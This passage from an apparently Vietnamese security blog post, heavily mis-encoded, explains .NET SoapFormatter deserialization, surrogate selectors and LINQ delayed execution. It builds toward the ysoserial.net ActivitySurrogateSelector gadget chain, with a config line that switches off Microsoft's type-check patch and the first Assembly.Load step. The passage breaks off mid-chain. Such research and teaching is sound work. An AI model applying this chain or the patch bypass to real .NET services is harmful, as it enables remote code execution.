há»“i. NÃ³ cung cáº¥p má»™t cÃ¡ch Ä‘á»ƒ tÃ¹y chá»‰nh hoáº·c thay Ä‘á»•i cÃ¡ch mÃ  má»™t Ä‘á»‘i tÆ°á»£ng Ä‘Æ°á»£c tuáº§n tá»± hÃ³a hoáº·c phá»¥c há»“i.\nSurrogate thÆ°á»ng Ä‘Æ°á»£c sá»­ dá»¥ng trong cÃ¡c trÆ°á»ng há»£p nhÆ°:\nTuáº§n tá»± hÃ³a cÃ¡c Ä‘á»‘i tÆ°á»£ng khÃ´ng tuÃ¢n theo giao diá»‡n ISerializable. Äá»‘i tÆ°á»£ng cÃ³ dá»¯ liá»‡u nháº¡y cáº£m mÃ  báº¡n muá»‘n che giáº¥u hoáº·c khÃ´ng tuáº§n tá»± hÃ³a. Äá»‘i tÆ°á»£ng cÃ³ kiá»ƒu khÃ´ng tuÃ¢n theo quy táº¯c tuáº§n tá»± hÃ³a máº·c Ä‘á»‹nh cá»§a .NET Framework. Äá»ƒ sá»­ dá»¥ng Surrogate, báº¡n cáº§n triá»ƒn khai má»™t lá»›p SurrogateSelector vÃ  ghi Ä‘Ã¨ phÆ°Æ¡ng thá»©c GetSurrogate cá»§a nÃ³. PhÆ°Æ¡ng thá»©c GetSurrogate cho phÃ©p báº¡n xÃ¡c Ä‘á»‹nh Surrogate cá»¥ thá»ƒ Ä‘á»ƒ sá»­ dá»¥ng cho má»™t kiá»ƒu Ä‘á»‘i tÆ°á»£ng nháº¥t Ä‘á»‹nh.\nSurrogate giÃºp báº¡n kiá»ƒm soÃ¡t quÃ¡ trÃ¬nh tuáº§n tá»± hÃ³a vÃ  phá»¥c há»“i, cho phÃ©p tÃ¹y chá»‰nh vÃ  Ä‘iá»u chá»‰nh quÃ¡ trÃ¬nh nÃ y Ä‘á»ƒ Ä‘Ã¡p á»©ng nhu cáº§u cá»¥ thá»ƒ cá»§a á»©ng dá»¥ng cá»§a báº¡n.\nKhi proxy selector cho class Person Ä‘Æ°á»£c thiáº¿t láº­p cho SoapFormatter, method GetObjectData vÃ  SetObjectData trong class PersonSerializeSurrogate sáº½ Ä‘Æ°á»£c thá»±c thi trong quÃ¡ trÃ¬nh serialization vÃ  deserialization. (ÄÃ¢y lÃ  kiáº¿n thá»©c cÆ¡ báº£n, báº¡n cÃ³ thá»ƒ xem chi tiáº¿t táº¡i Ä‘Ã¢y)\nDo Ä‘Ã³, chÃºng ta tháº¥y, káº¿t quáº£ cá»§a p.Age Ä‘Æ°á»£c in ra lÃ  0 thay vÃ¬ 18 nhÆ° trÆ°á»›c Ä‘Ã³. LÃ½ do lÃ  vÃ¬ chÃºng ta Ä‘Ã£ control quÃ¡ trÃ¬nh serialize vÃ  deserialize cá»§a object p. Trong class PersonSerializeSurrogate, chá»‰ cÃ³ field name Ä‘Æ°á»£c serialize vÃ  deserialize nÃªn káº¿t quáº£ váº«n lÃ  Edisc. CÃ²n giÃ¡ trá»‹ cá»§a age lÃ  0 vÃ¬ Ä‘Ã³ lÃ  giÃ¡ trá»‹ máº·c Ä‘á»‹nh khi khÃ´ng Ä‘Æ°á»£c deserialize.\nMá»™t tÃ­nh nÄƒng cá»§a proxy selector cáº§n lÆ°u Ã½ á»Ÿ Ä‘Ã¢y lÃ : proxy selector cÃ³ thá»ƒ Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ serialization vÃ  deserialization báº¥t kÃ¬ class nÃ o ká»ƒ cáº£ nhá»¯ng class khÃ´ng Ä‘Ã¡nh dáº¥u serialized [Serializable]\nQuay láº¡i vÃ­ dá»¥ ban Ä‘áº§u, khi chÃºng ta sá»­ dá»¥ng proxy selector, class Person implements the serialization interface (notation: [Serializable])\nNáº¿u ta xÃ³a Ä‘i notation: [Serializable]. ChÆ°Æ¡ng trÃ¬nh váº«n cháº¡y, Ä‘Ã¢y lÃ  má»™t tÃ­nh nÄƒng cá»§a viá»‡c chá»n proxy.\nTrong quÃ¡ trÃ¬nh deserialize, luÃ´n cÃ³ 1 quÃ¡ trÃ¬nh xem xÃ©t liá»‡u class cÃ³ thá»ƒ seralize hay khÃ´ng? Äiá»u nÃ y dáº«n tá»›i má»™t váº¥n Ä‘á»: Má»™t class Ä‘Æ°á»£c serialize nhÆ°ng khi deserialize nÃ³ khÃ´ng thá»ƒ deserialize proxy selector Ä‘Æ°á»£c implement bá»Ÿi chÃºng ta. Äá»ƒ hiá»ƒu rÃµ hÆ¡n, hÃ£y sá»­a Ä‘á»•i má»™t chÃºt Ä‘oáº¡n code vÃ­ dá»¥ ban Ä‘áº§u nhÆ° sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 using System; using System.IO; using System.Runtime.Serialization; using System.Runtime.Serialization.Formatters.Soap; using System.Text; namespace SoapDeserialization { //[Serializable] class Person { private int age; private string name; public int Age { get =\u0026gt; age; set =\u0026gt; age = value; } public string Name { get =\u0026gt; name; set =\u0026gt; name = value; } public void SayHello() { Console.WriteLine(\u0026#34;hello from SayHello\u0026#34;); } } sealed class PersonSerializeSurrogate : ISerializationSurrogate { public void GetObjectData(object obj, SerializationInfo info, StreamingContext context) { var p = (Person)obj; info.AddValue(\u0026#34;Name\u0026#34;, p.Name); } public object SetObjectData(object obj, SerializationInfo info, StreamingContext context, ISurrogateSelector selector) { var p = (Person)obj; p.Name = info.GetString(\u0026#34;Name\u0026#34;); return p; } } class Program { static void Main(string[] args) { SoapFormatter soapFormatter = new SoapFormatter(); var ss = new SurrogateSelector(); ss.AddSurrogate(typeof(Person), new StreamingContext(StreamingContextStates.All), new PersonSerializeSurrogate()); soapFormatter.SurrogateSelector = ss; Person person = new Person(); person.Age = 18; person.Name = \u0026#34;Edisc\u0026#34;; MemoryStream stream = new MemoryStream(); // serialize soapFormatter.Serialize(stream, person); string soap = Encoding.UTF8.GetString(stream.ToArray()); Console.WriteLine(soap); Console.WriteLine(\u0026#34;========================================\u0026#34;); // deserialize stream.Position = 0; //Person p = (Person)soapFormatter.Deserialize(stream); //=================================== begin new code =================================== var fmt2 = new SoapFormatter(); Person p = (Person)fmt2.Deserialize(stream); //=================================== end new code =================================== Console.WriteLine(p.Name); Console.WriteLine(p.Age); p.SayHello(); Console.ReadKey(); } } } Káº¿t quáº£ khi cháº¡y chÆ°Æ¡ng trÃ¬nh:\ná» Ä‘oáº¡n code cÅ©, chÃºng ta dÃ¹ng cÃ¢u lá»‡nh (dÃ²ng 64)\n1 Person p = (Person)soapFormatter.Deserialize(stream); CÃ¢u lá»‡nh nÃ y sáº½ sá»­ dá»¥ng method SetObjectData() Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a trong class PersonSerializeSurrogate cá»§a chÃºng ta. CÃ²n vá»›i Ä‘oáº¡n code má»›i, object fmt2 sá»­ dá»¥ng native deserialzation do Ä‘Ã³, cÃ³ lá»—i xáº£y ra.\nLÃ½ do lÃ  khi parsing object trong deserializaed soap data, nÃ³ sáº½ gá»i method CheckSerializable Ä‘áº§u tiÃªn Ä‘á»ƒ xÃ¡c Ä‘á»‹nh xem liá»‡u Object muá»‘n parse cÃ³ thá»ƒ serializable khÃ´ng.\nClass Person trong Ä‘oáº¡n mÃ£ khÃ´ng thá»ƒ serialized do khÃ´ng implement interface ISerializable hoáº·c khÃ´ng cÃ³ cÃ¡c thuá»™c tÃ­nh Ä‘Æ°á»£c Ä‘Ã¡nh dáº¥u [Serializable]. Khi má»™t object Ä‘Æ°á»£c serialize, nÃ³ cáº§n Ä‘Ã¡p á»©ng má»™t sá»‘ yÃªu cáº§u Ä‘á»ƒ Ä‘áº£m báº£o quÃ¡ trÃ¬nh serialize vÃ  deserialize object Ä‘Æ°á»£c thá»±c hiá»‡n thÃ nh cÃ´ng.\nTrong trÆ°á»ng há»£p nÃ y, class Person khÃ´ng implemnet ISerializable vÃ  khÃ´ng cÃ³ thuá»™c tÃ­nh [Serializable] . Do Ä‘Ã³, object Person sáº½ cá»‘ gáº¯ng serialize báº±ng cÃ¡ch sá»­ dá»¥ng SoapFormatter, quÃ¡ trÃ¬nh nÃ y khÃ´ng thÃ nh cÃ´ng vÃ  gÃ¢y ra lá»—i.\nÄá»ƒ giáº£i quyáº¿t váº¥n Ä‘á» nÃ y, ta cáº§n sá»­ dá»¥ng class ActivitySurrogateSelector.\nIII ActivitySurrogateSelector Trong pháº§n trÆ°á»›c chÃºng ta Ä‘Ã£ biáº¿t cÃ³ tá»“n táº¡i má»™t váº¥n Ä‘á»: Má»™t class Ä‘Æ°á»£c serialize nhÆ°ng khi deserialize nÃ³ khÃ´ng thá»ƒ deserialize proxy selector Ä‘Æ°á»£c implement bá»Ÿi chÃºng ta. Khi thá»±c thi nÃ³ sáº½ vÄƒng ra lá»—i.\nVÃ  cuá»‘i pháº§n II, tÃ´i Ä‘Ã£ Ä‘á» cáº­p váº¥n Ä‘á» nÃ y cÃ³ thá»ƒ giáº£i quyáº¿t báº±ng ActivitySurrogateSelector\nTrong pháº§n nÃ y tÃ´i sáº½ tiáº¿n hÃ nh debug Ä‘á»ƒ hiá»ƒu rÃµ táº¡i sao ActivitySurrogateSelector cÃ³ thá»ƒ giáº£i quyáº¿t Ä‘Æ°á»£c.\n1. [background] ISerializationSurrogate and SurrogateSelector Vá»›i serialization vÃ  deserialization trong C#, chÃºng ta sáº½ tháº¥y cÃ³ lÃºc dÃ¹ng SurrogateSelector, cÃ³ lÃºc thÃ¬ implement ISerializationSurrogate. Váº­y sá»± khÃ¡c biá»‡t giá»¯a Ä‘Ãºng lÃ  gÃ¬?\nVá»›i ISerializationSurrogate, hÃ£y quay láº¡i vÃ­ dá»¥ á»Ÿ pháº§n trÆ°á»›c:\nDá»… tháº¥y, class PersonSerializeSurrogate cá»§a chÃºng ta implemnet láº¡i interface ISerializationSurrogate. HÃ£y debug vá»›i DnSpy64: Äáº§u tiÃªn, chÃºng ta cháº¡y code Ä‘á»ƒ build ra file .exe\nLoad file .exe vÃ  cÃ¡c thÆ° viá»‡n liÃªn quan vÃ o dnspy64\nÄáº·t breakpoint vÃ  nháº¥n F5, táº¡i Ã´ Executable, trá» Ä‘áº¿n file .exe mÃ  chÃºng ta muá»‘n thá»±c thi\nTháº¿ lÃ  debug thÃ´i:\nÃˆo, DnSpy báº£o lÃ  nÃªn dÃ¹ng báº£n 32bit Ä‘á»ƒ cháº¡y. Váº­y thÃ¬ Ä‘á»•i thÃ´i Ngon lÃ nh!! Váº­y debug thÃ´i Äáº·t breakpoint táº¡i soapFormatter.Serialize(stream, person) Trace, ta sáº½ tháº¥y System.Runtime.Serialization.Formatters.Soap.WriteObjectInfo.InitSerialize() Ä‘Æ°á»£c gá»i Äáº¿n dÃ²ng 79: Ta tháº¥y field m_surrogates cá»§a SurrogateSelector cÃ³ má»™t element lÃ  SoapDeserialization.PersonSerializeSurrogate. ÄÃ¢y lÃ  class mÃ  chÃºng ta implement!!!\nVá»›i SurrogateSelector proxy selector,hÃ£y chá»‰nh sá»­a vÃ­ dá»¥ trÆ°á»›c Ä‘Ã³ má»™t tÃ­:\nTrong vÃ­ dá»¥, dá»… tháº¥y Ä‘ang cÃ³ lá»—i xáº£y ra á»Ÿ dÃ²ng 59. LÃ½ do lÃ  thiáº¿u lib. Äá»ƒ fix lá»—i nÃ y ta chá»‰ cáº§n thÃªm thÆ° viá»‡n System.Configuration\nTÆ°Æ¡ng tá»± vá»›i á»Ÿ trÃªn, ta cÅ©ng debug NhÃ¬n vÃ o Ä‘Ã¢y, ta tháº¥y SurrogateSelector chá»©a ISerializationSurrogate vÃ  táº¥t cáº£ cÃ¡c object cá»§a ISerializationSurrogate Ä‘á»u lÃ  member cá»§a field m_surrogates cá»§a SurrogateSelector. Váº­y Ä‘iá»u nÃ y cÃ³ nghÄ©a gÃ¬?\nKhi chÃºng ta sá»­ dá»¥ng surrogateSelector.GetSurrogate, chÃºng ta implement GetSurrogate method trong SurrogateSelector object. Method GetSurrogate nÃ y cÃ³ thá»ƒ bá»‹ overwrite.\n2. ActivitySurrogateSelector BÃ¢y giá», hÃ£y quay láº¡i Ä‘oáº¡n code á»Ÿ pháº§n SurrogateSelector\nTa tháº¥y fmt2 khÃ´ng sá»­ dá»¥ng proxy selector nhÆ°ng nÃ³ láº¡i cÃ³ thá»ƒ deserialize mÃ  khÃ´ng bá»‹ lá»—i\nTáº¡i sao váº­y nhá»‰???\nCÃ¹ng debug Ä‘á»ƒ hiá»ƒu rÃµ nguyÃªn lÃ½ cá»§a ActivitySurrogateSelector. Tiáº¿p tá»¥c vá»›i pháº§n trÆ°á»›c Ä‘Ã³, ta cÃ³ surrogateSelector chá»©a MySurrogateSelector\nÄáº·t breakpoint táº¡i MySurrogateSelector vÃ  tiáº¿p tá»¥c, sáº½ tháº¥y surrogateSelector.GetSurrogate() á»Ÿ dÃ²ng 79 sáº½ gá»i MySurrogateSelector.GetSurrogate() VÃ¬ class Person khÃ´ng chá»‰ rÃµ Ä‘Æ°á»£c thuá»™c tÃ­nh [Serializable] nÃªn biáº¿n flag á»Ÿ dÃ²ng 13 sáº½ cÃ³ giÃ¡ trá»‹ true (vÃ¬ type.IsSerializable=false). Do Ä‘Ã³, nÃ³ sáº½ vÃ o dÃ²ng lá»‡nh 17. CÃ¢u lá»‡nh nÃ y sáº½ tráº£ vá» 1 instance cá»§a Object ObjectSurrogate Quay láº¡i dÃ²ng lá»‡nh 79 cá»§a InitSerialize(). VÃ¬ surrogateSelector vÃ  this.serializationSurrogate khÃ¡c null, nÃªn chÆ°Æ¡ng trÃ¬nh sáº½ vÃ o Ä‘iá»u kiá»‡n ráº½ nhÃ¡nh 1 Tiáº¿p tá»¥c chÆ°Æ¡ng trÃ¬nh, ta tháº¥y dÃ²ng lá»‡nh 84 Ä‘Æ°á»£c thá»±c thi F11 Ä‘á»ƒ Ä‘i vÃ o hÃ m bÃªn trong, ta sáº½ tháº¥y nÃ³ Ä‘i vÃ o hÃ m ObjectSurrogate.GetObjectData() Tiáº¿p tá»¥c Ä‘áº¿n dÃ²ng 155, info set type ActivitySurrogateSelector.ObjectSurrogate.ObjectSerializedRef Máº·t khÃ¡c, ta tháº¥y ObjectSerializedRef lÃ  má»™t class cÃ³ thá»ƒ serialize Ä‘Æ°á»£c.\nTiáº¿p tá»¥c chÆ°Æ¡ng trÃ¬nh, ta tháº¥y [this.si](http://this.si) sáº½ cÃ³ ObjectType lÃ  **ObjectSerializedRef - má»™t class cÃ³ thá»ƒ Serialize Ä‘Æ°á»£c.**\nDÃ²ng lá»‡nh 86 vÃ  tiáº¿p sau Ä‘Ã³ sáº½ lÃ m cho objectWriter trá»Ÿ thÃ nh 1 object cÃ³ thá»ƒ serialize\nTiáº¿p tá»¥c chÆ°Æ¡ng trÃ¬nh Äáº¿n Ä‘Ã¢y, giÃ¡ trá»‹ stm Ä‘Ã£ lÃ  má»™t serialized object. Do Ä‘Ã³, chÆ°Æ¡ng trÃ¬nh sáº½ tiáº¿p tá»¥c mÃ  khÃ´ng bá»‹ lá»—i\nNOTE:\nTrong Ä‘oáº¡n code cÃ³ sá»­ dá»¥ng cÃ¢u lá»‡nh:\n1 System.Configuration.ConfigurationManager.AppSettings.Set(\u0026#34;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck\u0026#34;, \u0026#34;true\u0026#34;); Má»¥c Ä‘Ã­ch cÃ¢u lá»‡nh nÃ y lÃ  bypass háº¡n cháº¿ khi test trÃªn cÃ¡c framework cÃ³ version cao vá»›i vÃ¬ Microsoft Ä‘Ã£ báº£n pacth tá»« phiÃªn báº£n 4.8 trá»Ÿ Ä‘i.\nYeah, váº­y lÃ  chÃºng ta Ä‘Ã£ hiá»ƒu táº¡i sao ActivitySurrogateSelector thÃ¬ khÃ´ng bá»‹ lá»—i: bá»Ÿi vÃ¬ khi tá»›i hÃ m Deserialize() thÃ¬ stm Ä‘Ã£ Ä‘Æ°á»£c chuyá»ƒn thÃ nh dáº¡ng serialize rá»“i.\nIV LINQ Knowledge Äá»ƒ hiá»ƒu Ä‘Æ°á»£c ActivitySurrogateSelector attack chain, ta cáº§n biáº¿t 1 Ã­t vá» Linq.\nTheo Ä‘á»‹nh nghÄ©a sÃ¡ch giÃ¡o khoa thÃ¬:\nThe official definition of Linq is Language Integrated Query (LINQ) is a series of technologies that directly integrate query functions into the C## language.Â It can be considered that Linq uses Lambda expressions to complete functions similar to SQL syntax.\nÄá»ƒ hiá»ƒu rÃµ, ta Ä‘i qua vÃ­ dá»¥ sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public static void Main(string[] args) { var word = \u0026#34;hello from linq.\u0026#34;; var words = word.Split(\u0026#39; \u0026#39;); var q1 = from s in words where s.ToLower().Contains(\u0026#39;o\u0026#39;) select s; Console.WriteLine(q1); foreach (var item in q1) { Console.WriteLine(item); } Console.ReadKey(); } khi cháº¡y, output sáº½ lÃ  vÃ  binary sau khi load vÃ o dnspy sáº½ Ä‘Æ°á»£c decompile nhÆ° sau\nTrong Ä‘oáº¡n code trÃªn, cÃ¢u lá»‡nh:\n1 2 3 var q1 = from s in words where s.ToLower().Contains(\u0026#39;o\u0026#39;) select s; TÃ´i tinh gá»n nÃ³ nhÆ° sau:\n1 words.Where(s =\u0026gt; s.ToLower().Contains(\u0026#39;o\u0026#39;)).Select(s=\u0026gt;s) Format Ä‘á»ƒ gá»i nhÆ° trÃªn Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a nhÆ° sau:\nÄá»ƒ vÃ o Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a nhÆ° trÃªn, tÃ´i dÃ¹ng extension GoToDnSpy. Khi áº¥n ctrl + click vÃ o tá»« khÃ³a where (Tá»« khÃ³a Where trong C## lÃ  má»™t phÆ°Æ¡ng thá»©c Ä‘Æ°á»£c sá»­ dá»¥ng trong thÆ° viá»‡n LINQ), extension nafy sáº½ dÃ¹ng dnspy decompile code trong thÆ° viá»‡n System.Linq (thÆ° viá»‡n nÃ y há»— trá»£ cháº¡y LINQ) vÃ  show lÃªn cho chÃºng ta\nnÃªn khi decompile báº±ng DnSpy. CÃ¢u lá»‡nh tÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i dnspy lÃ \n1 IEnumerable\u0026lt;string\u0026gt; q = Enumerable.Where\u0026lt;string\u0026gt;(words, (string s) =\u0026gt; Enumerable.Contains\u0026lt;char\u0026gt;(s.ToLower(), \u0026#39;o\u0026#39;)); HÃ£y phÃ¢n tÃ­ch má»™t cáº¥u trÃºc khai bÃ¡o nhÆ° sau: 1 public static IEnumerable\u0026lt;TSource\u0026gt; Where\u0026lt;TSource\u0026gt;(this IEnumerable\u0026lt;TSource\u0026gt; source, Func\u0026lt;TSource, bool\u0026gt; predicate) ÄÃ¢y lÃ  Ä‘á»‹nh nghÄ©a phÆ°Æ¡ng thá»©c, cho biáº¿t tÃªn cá»§a phÆ°Æ¡ng thá»©c (Where), cÃ¡ch truy cáº­p vÃ o phÆ°Æ¡ng thá»©c (public) vÃ  cÃ¡c tham sá»‘ mÃ  nÃ³ mong Ä‘á»£i:\npublic static: Äiá»u nÃ y cho biáº¿t phÆ°Æ¡ng thá»©c cÃ³ thá»ƒ Ä‘Æ°á»£c truy cáº­p tá»« báº¥t ká»³ Ä‘Ã¢u trong chÆ°Æ¡ng trÃ¬nh vÃ  khÃ´ng cáº§n má»™t Ä‘á»‘i tÆ°á»£ng cá»§a lá»›p Ä‘á»ƒ gá»i phÆ°Æ¡ng thá»©c nÃ y. IEnumerable\u0026lt;TSource\u0026gt;: ÄÃ¢y lÃ  kiá»ƒu dá»¯ liá»‡u tráº£ vá» cá»§a phÆ°Æ¡ng thá»©c. NÃ³ cho biáº¿t phÆ°Æ¡ng thá»©c sáº½ tráº£ vá» má»™t chuá»—i cÃ¡c pháº§n tá»­ kiá»ƒu TSource. Where\u0026lt;TSource\u0026gt;: ÄÃ¢y lÃ  má»™t phÆ°Æ¡ng thá»©c generic, Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh bá»Ÿi \u0026lt;TSource\u0026gt;, cÃ³ nghÄ©a lÃ  nÃ³ cÃ³ thá»ƒ hoáº¡t Ä‘á»™ng vá»›i báº¥t ká»³ kiá»ƒu nÃ o Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh bá»Ÿi ngÆ°á»i gá»i. this IEnumerable\u0026lt;TSource\u0026gt; source: ÄÃ¢y lÃ  tham sá»‘ Ä‘áº§u tiÃªn cÃ³ tÃªn lÃ  source, Ä‘áº¡i diá»‡n cho bá»™ sÆ°u táº­p Ä‘áº§u vÃ o mÃ  phÃ©p Where sáº½ Ä‘Æ°á»£c thá»±c hiá»‡n. Trong vÃ­ dá»¥, source Ä‘á» cáº­p Ä‘áº¿n má»™t bá»™ sÆ°u táº­p cÃ¡c pháº§n tá»­, cháº³ng háº¡n nhÆ° má»™t danh sÃ¡ch hoáº·c má»™t máº£ng. Func\u0026lt;TSource, bool\u0026gt; predicate: ÄÃ¢y lÃ  tham sá»‘ thá»© hai cÃ³ tÃªn lÃ  predicate. ÄÃ¢y lÃ  má»™t delegate cÃ³ kiá»ƒu Func\u0026lt;TSource, bool\u0026gt;, Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ xá»­ lÃ½ bá»™ sÆ°u táº­p vÃ  tráº£ vá» bá»™ sÆ°u táº­p káº¿t quáº£ sau khi xá»­ lÃ½. Delegate lÃ  gÃ¬?\nTrong ngÃ´n ngá»¯ láº­p trÃ¬nh C#, delegate lÃ  má»™t kiá»ƒu dá»¯ liá»‡u Ä‘áº·c biá»‡t, cho phÃ©p chÃºng ta táº¡o ra cÃ¡c tham chiáº¿u Ä‘áº¿n phÆ°Æ¡ng thá»©c. NÃ³ giá»‘ng nhÆ° má»™t con trá» hÃ m trong cÃ¡c ngÃ´n ngá»¯ khÃ¡c. Delegate cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ táº¡o ra cÃ¡c biá»ƒu thá»©c hÃ m (function expressions) vÃ  truyá»n chÃºng nhÆ° cÃ¡c tham sá»‘ cho cÃ¡c phÆ°Æ¡ng thá»©c khÃ¡c.\nQuay láº¡i vá»›i vÃ­ dá»¥ cá»§a chÃºng ta:\n1 words.Where(s =\u0026gt; s.ToLower().Contains(\u0026#39;o\u0026#39;)).Select(s=\u0026gt;s) Where() vÃ  Select() lÃ  hai phÆ°Æ¡ng thá»©c Ä‘Æ°á»£c sá»­ dá»¥ng trong LINQ. Where() thá»±c hiá»‡n viá»‡c lá»c cÃ¡c pháº§n tá»­ trong bá»™ sÆ°u táº­p dá»±a trÃªn má»™t Ä‘iá»u kiá»‡n Ä‘Æ°á»£c xÃ¡c Ä‘á»‹nh bá»Ÿi má»™t biá»ƒu thá»©c lambda. Trong vÃ­ dá»¥ nÃ y, biá»ƒu thá»©c lambda lÃ  s =\u0026gt; s.ToLower().Contains('o'), nghÄ©a lÃ  chá»‰ giá»¯ láº¡i cÃ¡c pháº§n tá»­ trong bá»™ sÆ°u táº­p mÃ  chá»©a kÃ½ tá»± \u0026lsquo;o\u0026rsquo;. Sau khi Where() hoÃ n thÃ nh, káº¿t quáº£ lÃ  má»™t collection chá»©a cÃ¡c pháº§n tá»­ Ä‘Ã£ Ä‘Æ°á»£c lá»c. Tiáº¿p theo, Select() thá»±c hiá»‡n viá»‡c chuyá»ƒn Ä‘á»•i cÃ¡c pháº§n tá»­ trong collection thÃ nh má»™t Ä‘á»‹nh dáº¡ng khÃ¡c dá»±a trÃªn má»™t biá»ƒu thá»©c lambda khÃ¡c. Trong vÃ­ dá»¥ nÃ y, biá»ƒu thá»©c lambda lÃ  s =\u0026gt; s, nghÄ©a lÃ  giá»¯ nguyÃªn cÃ¡c pháº§n tá»­ trong bá»™ sÆ°u táº­p. Khi hoÃ n thÃ nh Select(), chÃºng ta cÃ³ collection cuá»‘i cÃ¹ng, chá»©a cÃ¡c pháº§n tá»­ Ä‘Ã£ Ä‘Æ°á»£c lá»c vÃ  chuyá»ƒn Ä‘á»•i. VÃ¬ váº­y, hai quÃ¡ trÃ¬nh á»§y quyá»n (Where() vÃ  Select()) hoáº¡t Ä‘á»™ng láº§n lÆ°á»£t trÃªn input collectiono, xá»­ lÃ½ vÃ  truyá»n cÃ¡c pháº§n tá»­ qua láº¡i giá»¯a cÃ¡c phÆ°Æ¡ng thá»©c cho Ä‘áº¿n khi chÃºng Ä‘Æ°á»£c lá»c vÃ  chuyá»ƒn Ä‘á»•i thÃ nh output collection.\nMá»™t Ä‘iá»u lÆ°u Ã½ á»Ÿ Ä‘Ã¢y LINQ lÃ  kiá»ƒu delayed execution 1 2 3 var q1 = from s in words where s.ToLower().Contains(\u0026#39;o\u0026#39;) select s; Trong vÃ­ dá»¥ trÃªn, q1 lÃ  má»™t biáº¿n dÃ¹ng Ä‘á»ƒ lÆ°u trá»¯ truy váº¥n LINQ.\nTuy nhiÃªn, viá»‡c khai bÃ¡o q1 chá»‰ táº¡o ra má»™t thá»ƒ hiá»‡n cá»§a truy váº¥n, khÃ´ng thá»±c hiá»‡n viá»‡c xá»­ lÃ½ trá»±c tiáº¿p. Thá»±c táº¿, viá»‡c thá»±c hiá»‡n xá»­ lÃ½ vÃ  tráº£ vá» káº¿t quáº£ sáº½ xáº£y ra khi chÃºng ta thá»±c hiá»‡n viá»‡c chá»n (select) trÃªn q1. Khi chÃºng ta thá»±c hiá»‡n viá»‡c chá»n (select) trÃªn q1, truy váº¥n LINQ sáº½ Ä‘Æ°á»£c thá»±c thi vÃ  káº¿t quáº£ sáº½ Ä‘Æ°á»£c tráº£ vá». Äiá»u nÃ y cÃ³ nghÄ©a lÃ  LINQ thá»±c hiá»‡n trÃ¬ hoÃ£n (delayed execution), tá»©c lÃ  viá»‡c xá»­ lÃ½ truy váº¥n khÃ´ng xáº£y ra ngay láº­p tá»©c khi truy váº¥n Ä‘Æ°á»£c khai bÃ¡o, mÃ  sáº½ diá»…n ra chá»‰ khi káº¿t quáº£ cáº§n Ä‘Æ°á»£c truy xuáº¥t (vÃ­ dá»¥: khi chÃºng ta thá»±c hiá»‡n viá»‡c chá»n - select). Äiá»u nÃ y giÃºp tá»‘i Æ°u hiá»‡u suáº¥t cá»§a á»©ng dá»¥ng vÃ  giáº£m thiá»ƒu viá»‡c thá»±c hiá»‡n khÃ´ng cáº§n thiáº¿t cá»§a cÃ¡c truy váº¥n LINQ. Nghe thÃ¬ cÃ³ váº» khÃ³ hiá»ƒu, ta hÃ£y nhÃ¬n vÃ o bá»©c áº£nh nÃ y (tÃ´i sÆ°u táº§m trÃªn internet)\nÄÃ¢y lÃ  tÃ­nh cháº¥t quan trá»ng mÃ  chÃºng ta sáº½ dÃ¹ng cho ActivitySurrogateSelector attack chain.\nV Attack chain Trong ysoserial.net, SoapFormatter cÃ³ nhiá»u chains. Trong blog nÃ y, tÃ´i sáº½ trÃ¬nh bÃ y chain: ActivitySurrogateSelector\nYeah, tá»›i Ä‘Ã¢y chÃºng ta Ä‘Ã£ biáº¿t thÃªm:\nActivitySurrogateSelector Ä‘á»ƒ select 1 proxy, há»— trá»£ deserialize 1 class báº¥t kÃ¬ (khÃ´ng cáº§n tag [Serializable]) NgÃ´n ngá»¯ LINQ lÃ  cÃ³ má»™t tÃ­nh cháº¥t delayed execution Váº­y nhá»¯ng thá»© nÃ y giÃºp Ã­ch Ä‘iá»u gÃ¬?\nMá»™t chÃºt vá» Java deserialize:\ná»¨ng dá»¥ng RMI trong Java sáº½ thá»±c thi Runtime.exec() trong constructor, vÃ  thá»±c hiá»‡n malicious code sau khi load class\nTÆ°Æ¡ng tá»± trong C#:\nNáº¿u chÃºng ta cÃ³ thá»ƒ load má»™t assembly riÃªng lÃªn, thÃ¬ viá»‡c kÃ­ch hoáº¡t constructor() khi táº¡o má»™t instance má»›i cÅ©ng sáº½ thá»±c thi malicious code.\nNáº¿u chÃºng ta thay tháº¿ delegate trong LINQ, load assembly vÃ  táº¡o má»™t instance báº±ng cÃ¡ch thay tháº¿ delegate, thÃ¬ malicous code sáº½ Ä‘Æ°á»£c thá»±c thi sau khi kÃ­ch hoáº¡t LINQ.\nTá»« Ã½ tÆ°á»Ÿng nÃ y, Researcher James Forshaw Ä‘Ã£ thiáº¿t káº¿ má»™t chain deserialize nhÆ° sau\n1. IEnumerable to LINQ exploit chaining Chain cá»§a James Forshaw nhÆ° sau:\n1 2 3 byte[] -\u0026gt; Assembly.Load(byte[]) -\u0026gt; Assembly Assembly -\u0026gt; Assembly.GetType() -\u0026gt; Type[] Type[] -\u0026gt; Activator.CreateInstance(Type[]) -\u0026gt; object[] Chain trÃªn sá»­ dá»¥ng LINQ delegate Ä‘á»ƒ gá»i cÃ¡c process tá»« interface IEnumerable\n1 public static IEnumerable\u0026lt;TResult\u0026gt; Select\u0026lt;TSource, TResult\u0026gt;(this IEnumerable\u0026lt;TSource\u0026gt; source, Func\u0026lt;TSource, TResult\u0026gt; selector); Äáº§u tiÃªn: byte[] -\u0026gt; Assembly.Load(byte[]) -\u0026gt; Assembly Ä‘Æ°á»£c implement bá»Ÿi Ä‘oáº¡n code sau, trong Ä‘Ã³ e1 lÃ  má»™t Asembly object.\n1 2 3 List\u0026lt;byte[]\u0026gt; data = new List\u0026lt;byte[]\u0026gt;(); data.Add(File.ReadAllBytes(typeof(ExploitClass).Assembly.Location)); var e1 = data.Select(Assembly.Load); BÆ°á»›c 2: Assembly -\u0026gt; Assembly.GetType() -\u0026gt; Type[] Ä‘Æ°á»£c 